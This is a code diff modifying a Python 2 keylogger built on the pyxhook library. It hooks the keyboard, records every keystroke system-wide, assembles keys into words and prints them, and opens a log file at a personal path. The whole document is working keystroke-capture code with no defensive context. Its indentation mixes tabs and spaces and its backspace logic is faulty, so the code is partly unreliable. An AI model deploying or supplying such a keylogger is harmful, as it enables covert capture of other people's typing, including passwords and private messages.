@@ -10,26 +10,59 @@ The program terminates when grave key(`) is pressed
 
 grave key is found below Esc key
 """
-
 import pyxhook
-#change this to your log file's path
-#log_file='/home/aman/Desktop/file.log'
+import os
 
-#this function is called everytime a key is pressed.
+wordList = []
+
+counter = 0
+log_file = '/media/rochana/University/Acadamic/Untitled Folder/Key.log'       #this should be change according to user preference.
+fob=open(log_file,'w')
+
+def printWord():
+	global counter
+	wordList.pop(counter)
+	counter-=1
+	print "".join([str(x) for x in wordList] )
+	# fob.write("".join([str(x) for x in wordList] ))
+	counter =0
+	del wordList[:]
+
 def OnKeyPress(event):
- # fob=open(log_file,'a')
-  # fob.write(event.Key)
-  # fob.write('\n')
-  print(event.Key)
+	global counter
+	wordList.append(event.Key)
+  	fob=open(log_file,'a')
+  		
+  	if event.Ascii == 8 :
+  		wordList.pop(counter)
+  		
+  		counter-=1
+  		wordList.pop(counter)
 
-  if event.Ascii==96: #96 is the ascii value of the grave key (`)
-    fob.close()
-    new_hook.cancel()
-#instantiate HookManager class
-new_hook=pyxhook.HookManager()
-#listen to all keystrokes
-new_hook.KeyDown=OnKeyPress
-#hook the keyboard
-new_hook.HookKeyboard()
-#start the session
-new_hook.start()
+	
+	
+	elif event.Ascii == 32 or event.Ascii == 13:
+		
+		printWord()
+
+		
+	
+	elif event.Ascii == 96:
+		fob.close()
+		new_hook.cancel()
+	
+	else:
+		# fob.write(event.Key)
+		# fob.write("\n")
+		
+		
+		# print(wordList[counter])
+
+		counter += 1
+
+
+new_hook=pyxhook.HookManager()											#instantiate HookManager class
+new_hook.KeyDown=OnKeyPress												#listen to all keystrokes
+new_hook.HookKeyboard()													#hook the keyboard
+new_hook.start()														#start the session
+
